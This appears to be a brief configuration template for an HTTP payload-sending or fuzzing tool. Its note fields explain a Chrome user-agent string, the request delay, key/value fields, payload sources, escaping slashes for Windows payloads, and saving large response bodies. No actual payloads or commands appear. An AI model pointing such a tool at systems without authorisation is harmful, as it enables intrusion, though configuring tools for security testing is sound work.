userAgent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
_delayNotes: The delay between requests adds the number of seconds between payloads sent to the target...
_keyValueNotes: Leave the Key and Value Blank if you do not want it populated, create more if needed...
_payloadNotes: File - Reads a file specified below, List - Pulls the Payload from the list below
_notesPayloadList: You will need to escape the slashes with a windows payload
_bodySizeNotes: If the size of the Body returned is greater than the bodySize download it to the outputDirectory
